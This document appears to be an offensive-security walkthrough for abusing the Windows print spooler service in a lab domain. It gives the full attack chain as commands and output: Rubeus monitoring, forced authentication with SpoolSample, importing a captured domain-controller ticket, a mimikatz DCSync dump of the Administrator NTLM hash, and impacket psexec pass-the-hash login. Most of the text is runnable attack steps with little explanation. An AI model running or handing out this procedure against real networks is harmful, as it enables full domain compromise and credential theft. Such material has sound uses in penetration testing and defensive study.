# Abusing Spools Service using Rubeus, SpoolSample and Mimikatz.

1. Enumerate if the spoolss share is running and accessible.

```PowerShell
PS C:\Users\Public> dir \\SERVER01\pipe\spoolss
dir \\SERVER01\pipe\spoolss


    Directory: \\SERVER01\pipe


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
                                                 spoolss
```

2. Upload and run Rubeus on the target to monitor the connections on the RDP.

```cmd
C:\Users\Public>.\Rubeus.exe monitor /interval:5 /filteruser:SERVER01$
```

3. While Rubeus is monitoring, switch to a NT Authority System session and run SpoolSample to force the connection.

```cmd
C:\Users\Public>SpoolSample.exe SERVER01.sinhack.com SERVER02.sinhack.com
```

4. Rubeus should have retrieved the KRBTG TGT. Copy the base64 TGT and import it through Rubeus on a NT Authority System Session.

```cmd
C:\Users\Public>Rubeus.exe ptt /ticket:<base64>

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.3 


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

5. Run klist to verify that the ticket has been imported successfully.

```cmd
C:\Users\Public>klist
klist

Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>     Client: SERVER01$ @ SINHACK.COM
        Server: krbtgt/SINHACK.COM @ SINHACK.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
        Start Time: 5/17/2021 9:20:59 (local)
        End Time:   5/17/2021 19:20:59 (local)
        Renew Time: 5/24/2021 9:20:59 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY 
        Kdc Called: 
```

6. Now that the KRBTGT ticket of SINHACK.COM domain is imported, we are able to dump DCSYNC to get NTLM Hashes. Example with Administrator hash.

```cmd
C:\Users\Public\mimikatz_trunk\x64>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 12 2021 23:10:18
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /sinhack.com /user:Administrator
```

7. Using psexec from impacket, login the desired target.

```bash
python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@server01.sinhack.com -hashes "aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" -target-ip 192.168.x.x
```